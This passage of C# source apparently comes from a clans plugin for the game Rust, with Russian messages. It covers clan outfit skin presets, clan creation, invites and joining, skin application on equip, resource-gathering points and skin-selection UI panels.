                clan.SkinList["wear"]["hoodie"] = 2847191782;
                clan.SkinList["wear"]["pants"] = 2847191199;
                clan.SkinList["wear"]["shoes.boots"] = 2847191875;
                clan.SkinList["wear"]["coffeecan.helmet"] = 0;
                clan.SkinList["wear"]["roadsign.jacket"] = 0;
                clan.SkinList["weapon"]["lmg.m249"] = 0;
                clan.SkinList["weapon"]["rifle.ak"] = 2847191472;
                clan.SkinList["weapon"]["rifle.l96"] = 0;
                clan.SkinList["weapon"]["rifle.bolt"] = 0;
                player.ChatMessage("Вы выбрали черный сэт!");
            }
            if (Set == "demon")
            {
                clan.SkinList["wear"]["metal.facemask"] = 2396362535;
                clan.SkinList["wear"]["metal.plate.torso"] = 1960028199;
                clan.SkinList["wear"]["roadsign.kilt"] = 1960038887;
                clan.SkinList["wear"]["hoodie"] = 839290032;
                clan.SkinList["wear"]["pants"] = 839253668;
                clan.SkinList["wear"]["shoes.boots"] = 1775247971;
                clan.SkinList["wear"]["coffeecan.helmet"] = 0;
                clan.SkinList["wear"]["roadsign.jacket"] = 0;
                clan.SkinList["weapon"]["lmg.m249"] = 0;
                clan.SkinList["weapon"]["rifle.ak"] = 1121475294;
                clan.SkinList["weapon"]["rifle.l96"] = 0;
                clan.SkinList["weapon"]["rifle.bolt"] = 0;
                player.ChatMessage("Вы выбрали демон сэт!");
            }
            if (Set == "ahegao")
            {
                clan.SkinList["wear"]["metal.facemask"] = 2853415680;
                clan.SkinList["wear"]["metal.plate.torso"] = 2853416200;
                clan.SkinList["wear"]["roadsign.kilt"] = 2853414987;
                clan.SkinList["wear"]["hoodie"] = 2853407029;
                clan.SkinList["wear"]["pants"] = 2853408785;
                clan.SkinList["wear"]["shoes.boots"] = 2853415431;
                clan.SkinList["wear"]["coffeecan.helmet"] = 2853414412;
                clan.SkinList["wear"]["roadsign.jacket"] = 2853417272;
                clan.SkinList["weapon"]["lmg.m249"] = 0;
                clan.SkinList["weapon"]["rifle.ak"] = 2853423871;
                clan.SkinList["weapon"]["rifle.l96"] = 0;
                clan.SkinList["weapon"]["rifle.bolt"] = 0;
                player.ChatMessage("Вы выбрали ахегао сэт!");
            }
            if (Set == "salat")
            {
                clan.SkinList["wear"]["metal.facemask"] = 2676182710;
                clan.SkinList["wear"]["metal.plate.torso"] = 2676181139;
                clan.SkinList["wear"]["roadsign.kilt"] = 2676187164;
                clan.SkinList["wear"]["hoodie"] = 2676195926;
                clan.SkinList["wear"]["pants"] = 2676191858;
                clan.SkinList["wear"]["shoes.boots"] = 2676194532;
                clan.SkinList["wear"]["coffeecan.helmet"] = 0;
                clan.SkinList["wear"]["roadsign.jacket"] = 0;
                clan.SkinList["weapon"]["lmg.m249"] = 0;
                clan.SkinList["weapon"]["rifle.ak"] = 0;
                clan.SkinList["weapon"]["rifle.l96"] = 0;
                clan.SkinList["weapon"]["rifle.bolt"] = 0;
                player.ChatMessage("Вы выбрали салат сэт!");
            }
            if (Set == "red")
            {
                clan.SkinList["wear"]["metal.facemask"] = 2807059503;
                clan.SkinList["wear"]["metal.plate.torso"] = 2807059605;
                clan.SkinList["wear"]["roadsign.kilt"] = 2807059947;
                clan.SkinList["wear"]["hoodie"] = 2807056489;
                clan.SkinList["wear"]["pants"] = 2807058599;
                clan.SkinList["wear"]["shoes.boots"] = 2807059202;
                clan.SkinList["wear"]["coffeecan.helmet"] = 0;
                clan.SkinList["wear"]["roadsign.jacket"] = 0;
                clan.SkinList["weapon"]["lmg.m249"] = 0;
                clan.SkinList["weapon"]["rifle.ak"] = 2807058371;
                clan.SkinList["weapon"]["rifle.l96"] = 0;
                clan.SkinList["weapon"]["rifle.bolt"] = 0;
                player.ChatMessage("Вы выбрали красный сэт!");
            }
            if (Set == "white")
            {
                clan.SkinList["wear"]["metal.facemask"] = 2847678562;
                clan.SkinList["wear"]["metal.plate.torso"] = 2847678924;
                clan.SkinList["wear"]["roadsign.kilt"] = 2847681471;
                clan.SkinList["wear"]["hoodie"] = 2847677385;
                clan.SkinList["wear"]["pants"] = 2847677971;
                clan.SkinList["wear"]["shoes.boots"] = 2847678240;
                clan.SkinList["wear"]["coffeecan.helmet"] = 2847683501;
                clan.SkinList["wear"]["roadsign.jacket"] = 2847683313;
                clan.SkinList["weapon"]["lmg.m249"] = 2847683922;
                clan.SkinList["weapon"]["rifle.ak"] = 2847682807;
                clan.SkinList["weapon"]["rifle.l96"] = 0;
                clan.SkinList["weapon"]["rifle.bolt"] = 0;
                player.ChatMessage("Вы выбрали белый сэт!");
            }
            if (Set == "anonymous")
            {
                clan.SkinList["wear"]["metal.facemask"] = 852867111;
                clan.SkinList["wear"]["metal.plate.torso"] = 2847192740;
                clan.SkinList["wear"]["roadsign.kilt"] = 2847194089;
                clan.SkinList["wear"]["hoodie"] = 2847191782;
                clan.SkinList["wear"]["pants"] = 2847191199;
                clan.SkinList["wear"]["shoes.boots"] = 2847191875;
                clan.SkinList["wear"]["coffeecan.helmet"] = 0;
                clan.SkinList["wear"]["roadsign.jacket"] = 0;
                clan.SkinList["weapon"]["lmg.m249"] = 0;
                clan.SkinList["weapon"]["rifle.ak"] = 2847191472;
                clan.SkinList["weapon"]["rifle.l96"] = 0;
                clan.SkinList["weapon"]["rifle.bolt"] = 0;
                player.ChatMessage("Вы выбрали анонимус сэт!");
            }
            if (Set == "lw")
            {
                clan.SkinList["wear"]["metal.facemask"] = 2859118269;
                clan.SkinList["wear"]["metal.plate.torso"] = 2859119821;
                clan.SkinList["wear"]["roadsign.kilt"] = 2859120302;
                clan.SkinList["wear"]["hoodie"] = 2859115685;
                clan.SkinList["wear"]["pants"] = 2859116801;
                clan.SkinList["wear"]["shoes.boots"] = 2859117755;
                clan.SkinList["wear"]["coffeecan.helmet"] = 2859125104;
                clan.SkinList["wear"]["roadsign.jacket"] = 2859124743;
                clan.SkinList["weapon"]["lmg.m249"] = 2859124229;
                clan.SkinList["weapon"]["rifle.ak"] = 2859122868;
                clan.SkinList["weapon"]["rifle.l96"] = 0;
                clan.SkinList["weapon"]["rifle.bolt"] = 0;
                player.ChatMessage("Вы выбрали lw сэт!");
            }
            if (Set == "admin")
            {
                if (!permission.UserHasPermission(player.UserIDString, "Clans.adminset"))
                    SendReply(player, lang.GetMessage("У тебя нету разрешение на использование этой одежды!", this, player.UserIDString));
                else
                {
                    clan.SkinList["wear"]["metal.facemask"] = 2589006659;
                    clan.SkinList["wear"]["metal.plate.torso"] = 2589004697;
                    clan.SkinList["wear"]["roadsign.kilt"] = 2589012267;
                    clan.SkinList["wear"]["hoodie"] = 2497239256;
                    clan.SkinList["wear"]["pants"] = 2585612675;
                    clan.SkinList["wear"]["shoes.boots"] = 2589017818;
                    clan.SkinList["wear"]["coffeecan.helmet"] = 0;
                    clan.SkinList["wear"]["roadsign.jacket"] = 0;
                    clan.SkinList["weapon"]["lmg.m249"] = 0;
                    clan.SkinList["weapon"]["rifle.ak"] = 2445801655;
                    clan.SkinList["weapon"]["rifle.l96"] = 0;
                    clan.SkinList["weapon"]["rifle.bolt"] = 0;
                    player.ChatMessage("Вы выбрали админ сэт!");
                }
            }
            if (Set == "pig")
            {
                if (!permission.UserHasPermission(player.UserIDString, "Clans.Galaxyset"))
                    SendReply(player, lang.GetMessage("У тебя нету разрешение на использование этой одежды!", this, player.UserIDString));
                else
                {
                    clan.SkinList["wear"]["metal.facemask"] = 2828043768;
                    clan.SkinList["wear"]["metal.plate.torso"] = 2828025086;
                    clan.SkinList["wear"]["roadsign.kilt"] = 2828020257;
                    clan.SkinList["wear"]["hoodie"] = 2847233656;
                    clan.SkinList["wear"]["pants"] = 2817979991;
                    clan.SkinList["wear"]["shoes.boots"] = 2818318586;
                    clan.SkinList["wear"]["coffeecan.helmet"] = 0;
                    clan.SkinList["wear"]["roadsign.jacket"] = 0;
                    clan.SkinList["weapon"]["lmg.m249"] = 0;
                    clan.SkinList["weapon"]["rifle.ak"] = 2807058371;
                    clan.SkinList["weapon"]["rifle.l96"] = 0;
                    clan.SkinList["weapon"]["rifle.bolt"] = 0;
                    player.ChatMessage("Вы выбрали pig сэт!");
                }
            }
            if (Set == "Baby")
            {
                if (!permission.UserHasPermission(player.UserIDString, "Clans.Babyset"))
                    SendReply(player, lang.GetMessage("У тебя нету разрешение на использование этой одежды!", this, player.UserIDString));
                else
                {
                    clan.SkinList["wear"]["metal.facemask"] = 963790509;
                    clan.SkinList["wear"]["metal.plate.torso"] = 963790862;
                    clan.SkinList["wear"]["roadsign.kilt"] = 812154447;
                    clan.SkinList["wear"]["hoodie"] = 812145060;
                    clan.SkinList["wear"]["pants"] = 812150741;
                    clan.SkinList["wear"]["shoes.boots"] = 861247986;
                    clan.SkinList["wear"]["coffeecan.helmet"] = 812153394;
                    clan.SkinList["wear"]["roadsign.jacket"] = 812156281;
                    clan.SkinList["weapon"]["lmg.m249"] = 0;
                    clan.SkinList["weapon"]["rifle.ak"] = 963791989;
                    clan.SkinList["weapon"]["rifle.l96"] = 0;
                    clan.SkinList["weapon"]["rifle.bolt"] = 0;
                    player.ChatMessage("Вы выбрали Baby сет!");
                }
            }
            if (Set == "71mc")
            {
                if (!permission.UserHasPermission(player.UserIDString, "Clans.71set"))
                    SendReply(player, lang.GetMessage("У тебя нету разрешение на использование этой одежды!", this, player.UserIDString));
                else
                {
                    clan.SkinList["wear"]["metal.facemask"] = 2823912906;
                    clan.SkinList["wear"]["metal.plate.torso"] = 2823913978;
                    clan.SkinList["wear"]["roadsign.kilt"] = 2823914389;
                    clan.SkinList["wear"]["hoodie"] = 2823915389;
                    clan.SkinList["wear"]["pants"] = 2823915058;
                    clan.SkinList["wear"]["shoes.boots"] = 2823914748;
                    clan.SkinList["wear"]["coffeecan.helmet"] = 0;
                    clan.SkinList["wear"]["roadsign.jacket"] = 0;
                    clan.SkinList["weapon"]["lmg.m249"] = 2445799790;
                    clan.SkinList["weapon"]["rifle.ak"] = 2823918586;
                    clan.SkinList["weapon"]["rifle.l96"] = 2445788090;
                    clan.SkinList["weapon"]["rifle.bolt"] = 0;
                    player.ChatMessage("Вы выбрали дисен сэт!");
                }
            }
            player.ChatMessage("Если вы не нашли нужный сэт пишите нам группу в вк!\nМы обязательно добавим этот сэт!");
        }

        [ConsoleCommand("clanmainui")]
        void cmdClanOverview(BasePlayer player)
        {
            var current = this.covalence.Players.FindPlayerById(player.UserIDString);
            var myClan = findClanByUser(current.Id);
            var sb = new StringBuilder();

            if (myClan == null)
            {
                SendReply(player, "Создайте клан /clan create tag");
                return;
            }
            NewClanUI(player);
        }
        [ConsoleCommand("clan.page")]
        void cmdClanPage(BasePlayer player, string[] args)
        {
            var current = this.covalence.Players.FindPlayerById(player.UserIDString);
            var myClan = findClanByUser(current.Id);
            var sb = new StringBuilder();

            if (myClan == null)
            {
                SendReply(player, "Создайте клан /clan create tag");
                return;
            }
            NewClanUI(player, Convert.ToInt32(args[0]));
        }

        void cmdClanCreate(BasePlayer player, string[] args)
        {
            var current = this.covalence.Players.FindPlayerById(player.UserIDString);
            var myClan = findClanByUser(current.Id);
            if (myClan != null)
            {
                PrintChat(player, string.Format(msg("youalreadymember", current.Id)));
                return;
            }
            if (usePermToCreateClan && !permission.UserHasPermission(current.Id, permissionToCreateClan))
            {
                PrintChat(player, msg("nopermtocreate", current.Id));
                return;
            }
            if (args.Length < 2)
            {
                PrintChat(player, string.Format(msg("usagecreate", current.Id), colorCmdUsage));
                return;
            }
            if (tagReExt.IsMatch(args[1]))
            {
                PrintChat(player, string.Format(msg("hintchars", current.Id), allowedSpecialChars));
                return;
            }
            if (args[1].Length < tagLengthMin || args[1].Length > tagLengthMax)
            {
                PrintChat(player, string.Format(msg("hintlength", current.Id), tagLengthMin, tagLengthMax));
                return;
            }
            if (args.Length > 2)
            {
                args[2] = args[2].Trim();
                if (args[2].Length < 2 || args[2].Length > 30)
                {
                    PrintChat(player, string.Format(msg("providedesc", current.Id)));
                    return;
                }
            }
            if (enableWordFilter && FilterText(args[1]))
            {
                PrintChat(player, string.Format(msg("bannedwords", current.Id)));
                return;
            }
            string[] clanKeys = clans.Keys.ToArray();
            clanKeys = clanKeys.Select(c => c.ToLower()).ToArray();
            if (clanKeys.Contains(args[1].ToLower()))
            {
                PrintChat(player, string.Format(msg("tagblocked", current.Id)));
                return;
            }
            myClan = Clan.Create(args[1], args.Length > 2 ? args[2] : string.Empty, current.Id, current.Name, "https://www.guilded.gg/asset/GameIcons/Rust-lg.png");
            clans.Add(myClan.tag, myClan);
            clanCache[current.Id] = myClan;

            SetupPlayer(player, current, clan: myClan);
            myClan.AddBasePlayer(player);

            if (usePermGroups && !permission.GroupExists(permGroupPrefix + myClan.tag)) permission.CreateGroup(permGroupPrefix + myClan.tag, "Clan " + myClan.tag, 0);
            if (usePermGroups && !permission.UserHasGroup(current.Id, permGroupPrefix + myClan.tag)) permission.AddUserGroup(current.Id, permGroupPrefix + myClan.tag);
            myClan.OnCreate();
            myClan.total++;
            PrintChat(player, string.Format(msg("nownewowner", current.Id), myClan.tag, myClan.description) + "\n" + string.Format(msg("inviteplayers", current.Id), colorCmdUsage));
            return;
        }
        public void InvitePlayer(BasePlayer player, string targetId) => cmdClanInvite(player, new string[] {
            "", targetId
        }
        );




        void cmdClanInvite(BasePlayer player, string[] args)
        {
            var current = this.covalence.Players.FindPlayerById(player.UserIDString);
            var myClan = findClanByUser(current.Id);
            if (myClan == null)
            {
                PrintChat(player, string.Format(msg("notmember", current.Id)));
                return;
            }
            if (args.Length < 2)
            {
                PrintChat(player, string.Format(msg("usageinvite", current.Id), colorCmdUsage));
                return;
            }
            if (!myClan.IsOwner(current.Id) && !myClan.IsCouncil(current.Id) && !myClan.IsModerator(current.Id))
            {
                PrintChat(player, string.Format(msg("notmoderator", current.Id)));
                return;
            }
            var invPlayer = myClan.GetIPlayer(args[1]);
            if (invPlayer == null)
            {
                PrintChat(player, string.Format(msg("nosuchplayer", current.Id), args[1]));
                return;
            }
            if (myClan.members.ContainsKey(invPlayer.Id))
            {
                PrintChat(player, string.Format(msg("alreadymember", current.Id), invPlayer.Name));
                return;
            }
            if (myClan.invites.ContainsKey(invPlayer.Id))
            {
                PrintChat(player, string.Format(msg("alreadyinvited", current.Id), invPlayer.Name));
                return;
            }
            if (findClanByUser(invPlayer.Id) != null)
            {
                PrintChat(player, string.Format(msg("alreadyinclan", current.Id), invPlayer.Name));
                return;
            }
            if (usePermToJoinClan && !permission.UserHasPermission(invPlayer.Id, permissionToJoinClan))
            {
                PrintChat(player, string.Format(msg("nopermtojoinbyinvite", current.Id), invPlayer.Name));
                return;
            }
            myClan.invites.Add(invPlayer.Id, UnixTimeStampUTC());
            if (!pendingPlayerInvites.ContainsKey(invPlayer.Id)) pendingPlayerInvites.Add(invPlayer.Id, new List<string>());
            pendingPlayerInvites[invPlayer.Id].Add(myClan.tag);
            myClan.BroadcastLoc("invitebroadcast", myClan.ColNam(current.Id, current.Name), myClan.ColNam(invPlayer.Id, invPlayer.Name));
            if (invPlayer.IsConnected)
            {
                var invited = rust.FindPlayerByIdString(invPlayer.Id);
                if (invited != null) PrintChat(invited, string.Format(msg("claninvite", invPlayer.Id), myClan.tag, myClan.description, colorCmdUsage));
                InterfaceUI(invited, myClan.tag);
            }
            myClan.updated = UnixTimeStampUTC();
        }

        string ButtonListed = "[{\"name\":\"clans_player{id}\",\"parent\":\"clans_main7\",\"components\":[{\"type\":\"UnityEngine.UI.Image\",\"color\":\"{color}\"},{\"type\":\"RectTransform\",\"anchormin\":\"0.001 {amin}\",\"anchormax\":\"0.998 {amax}\",\"offsetmin\":\"0 0\",\"offsetmax\":\"1 1\"}]},{\"name\":\"CuiElement\",\"parent\":\"clans_player{id}\",\"components\":[{\"type\":\"UnityEngine.UI.Text\",\"text\":\"\",\"fontSize\":16,\"font\":\"robotocondensed-bold.ttf\",\"align\":\"MiddleCenter\"},{\"type\":\"UnityEngine.UI.Outline\",\"color\":\"0 0 0 0.2784314\",\"distance\":\"1 -1\"},{\"type\":\"RectTransform\",\"anchormin\":\"0 0\",\"anchormax\":\"1 1\",\"offsetmin\":\"0 0\",\"offsetmax\":\"1 1\"}]},{\"name\":\"CuiElement\",\"parent\":\"clans_player{id}\",\"components\":[{\"type\":\"UnityEngine.UI.Button\",\"command\":\"{command}\",\"color\":\"1 1 1 0\"},{\"type\":\"RectTransform\",\"anchormin\":\"0 0\",\"anchormax\":\"1 1\",\"offsetmin\":\"0 0\",\"offsetmax\":\"1 1\"}]}]";

        private string GetImageUrl(string shortname, ulong skinid) =>
           ImageLibrary?.Call("GetImage", shortname, skinid) as string;

        private void AddLoadOrder(IDictionary<string, string> imageList, bool replace = false) =>
           ImageLibrary?.Call("ImportImageList", Title, imageList, (ulong)ResourceId, replace);

        bool? CanWearItem(PlayerInventory inventory, Item item, int targetPos)
        {
            if (inventory == null || item == null) return null;
            var player = inventory.gameObject.ToBaseEntity() as BasePlayer;
            if (player == null) return null;
            var clan = findClanByUser(player.UserIDString);
            if (clan != null)
                if (clan.SkinList["wear"].ContainsKey(item.info.shortname))
                    item.skin = clan.SkinList["wear"][item.info.shortname];
            return null;
        }

        private bool? CanEquipItem(PlayerInventory inventory, Item item, int targetPos)
        {
            if (inventory == null || item == null) return null;
            var player = inventory.gameObject.ToBaseEntity() as BasePlayer;
            if (player == null) return null;
            var clan = findClanByUser(player.UserIDString);
            if (clan != null)
            {
                if (clan.SkinList["weapon"].ContainsKey(item.info.shortname) && item.skin != clan.SkinList["weapon"][item.info.shortname])
                {
                    item.skin = clan.SkinList["weapon"][item.info.shortname];
                    item.MarkDirty();
                    if (item.GetHeldEntity() != null)
                    {
                        item.GetHeldEntity().skinID = clan.SkinList["weapon"][item.info.shortname];
                        item.GetHeldEntity().SendNetworkUpdate();
                    }
                }
            }
            return null;
        }

        private void OnActiveItemChanged(BasePlayer player, Item oldItem, Item item)
        {
            if (player == null || item == null) return;
            var clan = findClanByUser(player.UserIDString);
            if (clan != null)
            {
                if (clan.SkinList["weapon"].ContainsKey(item.info.shortname) && item.skin != clan.SkinList["weapon"][item.info.shortname] && item.skin == 0)
                {
                    item.skin = clan.SkinList["weapon"][item.info.shortname];
                    item.MarkDirty();
                    if (item.GetHeldEntity() != null)
                    {
                        item.GetHeldEntity().skinID = clan.SkinList["weapon"][item.info.shortname];
                        item.GetHeldEntity().SendNetworkUpdate();
                    }
                }
            }
        }

        static readonly DateTime epoch = new DateTime(1970, 1, 1, 0, 0, 0);

        static double CurrentTime() => DateTime.UtcNow.Subtract(epoch).TotalSeconds;

        private double IsBlocked()
        {
            return 1;
            var lefTime = SaveRestore.SaveCreatedTime.ToUniversalTime().Subtract(epoch).TotalSeconds + 86400 - CurrentTime();
            return lefTime > 0 ? lefTime : 0;
        }

        private void SmeltOre(BasePlayer player, Item item, bool bonus)
        {
            if (IsBlocked() == 0) return;
            string shortname = "";
            switch (item.info.shortname)
            {
                case "stones":
                    shortname = "stones";
                    break;
                case "metal.fragments":
                    shortname = "metal.ore";
                    break;
                case "sulfur":
                    shortname = "sulfur.ore";
                    break;
                case "metal.refined":
                    shortname = "hq.metal.ore";
                    break;
            }
            var clan = findClanByUser(player.UserIDString);
            if (clan != null && clan.members[player.UserIDString].GatherInfo.ContainsKey(shortname) || clan.Res.ContainsKey(shortname))
            {
                if (clan.Change.ContainsKey(shortname) && clan.Change[shortname].Complete < clan.Change[shortname].Need)
                {
                    clan.Change[shortname].Complete = clan.Change[shortname].Complete + item.amount;
                    clan.members[player.UserIDString].GatherInfo[shortname] = clan.members[player.UserIDString].GatherInfo[shortname] + item.amount;
                    if (clan.Change[shortname].Complete > clan.Change[shortname].Need)
                        clan.Change[shortname].Complete = clan.Change[shortname].Need;
                }
                clan.members[player.UserIDString].GatherInfo[item.info.shortname] += item.amount;
                clan.Res[item.info.shortname] += item.amount;
            }
            clan.ClanPoints += PointFarm;
            clan.members[player.UserIDString].PlayerPoints += PointFarm;
        }

        void OnDispenserGather(ResourceDispenser dispenser, BaseEntity entity, Item item)
        {
            if (IsBlocked() == 0) return;
            if (!entity.ToPlayer() || entity == null || item == null) return;

            var player = entity.ToPlayer();
            if (player == null || player.IsNpc) return;
            var clan = findClanByUser(player.UserIDString);
            if (clan != null && clan.Res.ContainsKey(item.info.shortname))
            {
                NextTick(() =>
                {
                    if (player == null || clan == null || item == null) return;
                    clan.Res[item.info.shortname] += item.amount;

                });
            }
            if (clan != null && clan.members.ContainsKey(player.UserIDString) && clan.members[player.UserIDString].GatherInfo.ContainsKey(item.info.shortname))
                if (clan.Change.ContainsKey(item.info.shortname) && clan.Change[item.info.shortname].Complete < clan.Change[item.info.shortname].Need)
                {
                    NextTick(() =>
                    {
                        if (player == null || clan == null || item == null) return;
                        clan.Farm = clan.Farm + item.amount;
                        if (!clan.members.ContainsKey(player.UserIDString)) return;
                        clan.Change[item.info.shortname].Complete = clan.Change[item.info.shortname].Complete + item.amount;
                        clan.members[player.UserIDString].GatherInfo[item.info.shortname] = clan.members[player.UserIDString].GatherInfo[item.info.shortname] + item.amount;
                        if (clan.Change[item.info.shortname].Complete > clan.Change[item.info.shortname].Need)
                            clan.Change[item.info.shortname].Complete = clan.Change[item.info.shortname].Need;

                    });

                }
        }
        void OnDispenserBonus(ResourceDispenser disp, BasePlayer player, Item item)
        {
            if (IsBlocked() == 0) return;
            if (player == null) return;
            if (player == null || player.IsNpc) return;

            var clan = findClanByUser(player.UserIDString);
            if (clan != null && clan.Res.ContainsKey(item.info.shortname))
            {
                NextTick(() =>
                {
                    if (player == null || clan == null || item == null) return;
                    clan.Res[item.info.shortname] += item.amount;

                });
            }
            if (clan != null && clan.members[player.UserIDString].GatherInfo.ContainsKey(item.info.shortname))
            {
                NextTick(() =>
                {
                    if (player == null || clan == null || item == null) return;
                    clan.Farm = clan.Farm + item.amount;
                    if (!clan.members.ContainsKey(player.UserIDString)) return;
                    if (clan.Change.ContainsKey(item.info.shortname) && clan.Change[item.info.shortname].Complete < clan.Change[item.info.shortname].Need)
                    {
                        clan.Change[item.info.shortname].Complete = clan.Change[item.info.shortname].Complete + item.amount;
                        clan.members[player.UserIDString].GatherInfo[item.info.shortname] = clan.members[player.UserIDString].GatherInfo[item.info.shortname] + item.amount;
                        if (clan.Change[item.info.shortname].Complete > clan.Change[item.info.shortname].Need)
                            clan.Change[item.info.shortname].Complete = clan.Change[item.info.shortname].Need;
                    }
                    clan.ClanPoints += PointFarm;
                    clan.members[player.UserIDString].PlayerPoints += PointFarm;
                });
            }

        }

        [ConsoleCommand("clans_getskinIds")]
        void cmdClansGetSkinList(ConsoleSystem.Arg args)
        {
            //СЮДА СТРАНИЦЫ!
            var player = args.Player();
            var clan = findClanByUser(player.UserIDString);
            if (clan == null) return;
            if (args.Args.Length < 2) return;
            int page;
            if (!int.TryParse(args.Args[1], out page))
                page = 0;


            var SkinLists = SkinList[args.Args[0]].Select(p => p.Value).Skip(page * 32).ToList();

            CuiHelper.DestroyUi(player, "MainSkins");

            var elements = new CuiElementContainer();

            elements.Add(new CuiPanel
            {
                CursorEnabled = true,
                Image = { Color = $"{HexToRustFormat("#322D246A")}", Material = "assets/content/ui/uibackgroundblur.mat" },
                RectTransform = { AnchorMin = $"0 0", AnchorMax = $"1 1" }
            }, "MainClan", "MainSkins");

            elements.Add(new CuiButton
            {
                RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1" },
                Button = { Close = "MainSkins", Color = "0 0 0 0" }
            }, "MainSkins");

            UI.AddImage(ref elements, "MainSkins", "ClanSkin", $"{HexToRustFormat("#74706A6D")}", "", "", "0.5 0.5", "0.5 0.5", $"-412 0", $"-173 180");
            UI.AddImage(ref elements, "MainSkins", "ClanSkins", $"{HexToRustFormat("#74706A6D")}", "", "", "0.5 0.5", "0.5 0.5", $"-152 -130", $"408 180");
            UI.AddText(ref elements, "ClanSkin", "Title", "1 1 1 0.8", $"ВЫБРАННЫЕ СКИНЫ", TextAnchor.MiddleCenter, 20, "0.5 0.5", "0.5 0.5", "-100 60", "100 95");

            double offsetxmin2 = -101, offsetxmax2 = -41, offsetymin2 = -3, offsetymax2 = 58;
            int skinCount = 0, a = 0;
            string color = string.Empty;
            foreach (var type in clan.SkinList)
            {
                foreach (var skin in type.Value)
                {
                    string command = $"clans_getskinIds {skin.Key} 0";
                    if (skinCount == 6)
                    {
                        break;
                    }

                    color = skin.Key == args.Args[0] ? $"{HexToRustFormat("#128A253E")}" : $"{HexToRustFormat("#4E4A477D")}";
                    UI.AddImage(ref elements, "ClanSkin", "Skin", color, "", "", "0.5 0.5", "0.5 0.5", $"{offsetxmin2} {offsetymin2}", $"{offsetxmax2} {offsetymax2}");
                    UI.AddRawImage(ref elements, "Skin", "SkinIMG", GetImageSkin(skin.Key, skin.Value), "1 1 1 1", "", "", "0 0", "1 1", "0 0", "0 0");
                    UI.AddButton(ref elements, "Skin", "SetSkin", $"{command}", "", $"0 0 0 0", "", "", "0 0", "1 1", "0 0", "0 0");

                    offsetxmin2 += 72;
                    offsetxmax2 += 72;
                    if (a == 2)
                    {
                        offsetxmin2 = -101;
                        offsetxmax2 = -41;
                        offsetymin2 -= 72;
                        offsetymax2 -= 72;
                        a = 0;
                    }
                    else
                    {
                        a++;
                    }

                    skinCount++;
                }
            }

            string commandprev = page > 0 ? $"clans_getskinIds {args.Args[0]} {page - 1}" : "";
            string commandnext = SkinLists.Skip(32 * (page + 1)).Count() != 0 ? $"clans_getskinIds {args.Args[0]} {page + 1}" : "";

            elements.Add(new CuiButton
            {
                Button = { Color = $"{HexToRustFormat("#7A7671FF")}", Command = commandprev },
                Text = { Text = "<", Color = "1 0.9294118 0.8666667 1", FontSize = 14, Align = TextAnchor.MiddleCenter },
                RectTransform = { AnchorMin = $"0 0", AnchorMax = $"0 0", OffsetMin = "5 5", OffsetMax = "35 35" },
            }, "ClanSkins", "PrevBTN");

            elements.Add(new CuiButton
            {
                Button = { Color = $"{HexToRustFormat("#7A7671FF")}", Command = commandnext },
                Text = { Text = ">", Color = "1 0.9294118 0.8666667 1", FontSize = 14, Align = TextAnchor.MiddleCenter },
                RectTransform = { AnchorMin = $"0 0", AnchorMax = $"0 0", OffsetMin = "45 5", OffsetMax = "75 35" },
            }, "ClanSkins", "NextBTN");

            double offsetxmin3 = -274, offsetxmax3 = -214, offsetymin3 = 92, offsetymax3 = 152;
            int skinCount1 = 0, b = 0;

            foreach (var check in SkinLists.Skip(page * 32).Take(32))
            {
                if (skinCount1 == 32) break;

                UI.AddImage(ref elements, "ClanSkins", "Skins1", $"{HexToRustFormat("#4E4A477D")}", "", "", "0.5 0.5", "0.5 0.5", $"{offsetxmin3} {offsetymin3}", $"{offsetxmax3} {offsetymax3}");
                UI.AddRawImage(ref elements, "Skins1", "SkinIMG1", GetImageSkin(args.Args[0], (check)), "1 1 1 1", "", "", "0 0", "1 1", "0 0", "0 0");
                UI.AddButton(ref elements, "Skins1", "SelectSkin", $"clan_changeskin {args.Args[0]} {check}", "", $"0 0 0 0", "", "", "0 0", "1 1", "0 0", "0 0");
                offsetxmin3 += 70;
                offsetxmax3 += 70;
                if (b == 7)
                {
                    offsetxmin3 = -274;
                    offsetxmax3 = -214;
                    offsetymin3 -= 69;
                    offsetymax3 -= 69;
                    b = 0;
                }
                else
                {
                    b++;
                }

                skinCount1++;
            }

            CuiHelper.AddUi(player, elements);
        }
        [ConsoleCommand("join")]
        void ConsoleClanJoin(ConsoleSystem.Arg args)
        {
            var player = args.Player();
            var current = this.covalence.Players.FindPlayerById(player.UserIDString);
            var myClan = findClanByUser(current.Id);
            if (myClan != null)
            {
                PrintChat(player, string.Format(msg("youalreadymember", current.Id)));
                return;
            }
            if (usePermToJoinClan && !permission.UserHasPermission(current.Id, permissionToJoinClan))
            {
                PrintChat(player, msg("nopermtojoin", current.Id));
                return;
            }
            if (args.Args.Length != 1)
            {
                PrintChat(player, string.Format(msg("usagejoin", current.Id), colorCmdUsage));
                return;
            }
            myClan = findClan(args.Args[0]);
            if (myClan == null || !myClan.IsInvited(current.Id))
            {
                PrintChat(player, string.Format(msg("younotinvited", current.Id)));
                return;
            }
            if (limitMembers >= 0 && myClan.members.Count() >= limitMembers)
            {
                PrintChat(player, string.Format(msg("reachedmaximum", current.Id)));
                return;
            }
            CuiHelper.DestroyUi(player, Layer);
            myClan.invites.Remove(current.Id);
            pendingPlayerInvites.Remove(current.Id);
            myClan.members.Add(current.Id, new PlayerStats());
            clanCache[current.Id] = myClan;
            myClan.AddBasePlayer(player);
            SetupPlayer(player, current, clan: myClan);


            if (usePermGroups && !permission.UserHasGroup(current.Id, permGroupPrefix + myClan.tag)) permission.AddUserGroup(current.Id, permGroupPrefix + myClan.tag);
            myClan.BroadcastLoc("playerjoined", myClan.ColNam(current.Id, current.Name));
            myClan.updated = UnixTimeStampUTC();
            myClan.total++;
            myClan.OnUpdate();
            List<string> others = new List<string>(myClan.members.Keys);
            others.Remove(current.Id);
            Interface.Oxide.CallHook("OnClanMemberJoined", current.Id, others);
        }

        string Layer = "Interface_UI";

        void InterfaceUI(BasePlayer player, string name)
        {
            CuiHelper.DestroyUi(player, Layer);
            var container = new CuiElementContainer();

            container.Add(new CuiPanel
            {
                CursorEnabled = false,
                RectTransform = { AnchorMin = "0.4 0.6", AnchorMax = "0.6 0.75" },
                Image = { Color = "0.5 0.5 0.5 0.8" }
            }, "Overlay", Layer);

            container.Add(new CuiLabel
            {
                RectTransform = { AnchorMin = "0.05 0.4", AnchorMax = "0.95 0.99", OffsetMin = "2 2" },
                Text = { Text = $"<size=20>ВСТУПЛЕНИЕ В КЛАН</size>\nВас пригласили в клан {name}.Вы можете принять либо отклонить инвайт!!", Color = "1 1 1 0.8", Align = TextAnchor.MiddleCenter, Font = "robotocondensed-bold.ttf", FontSize = 12 }
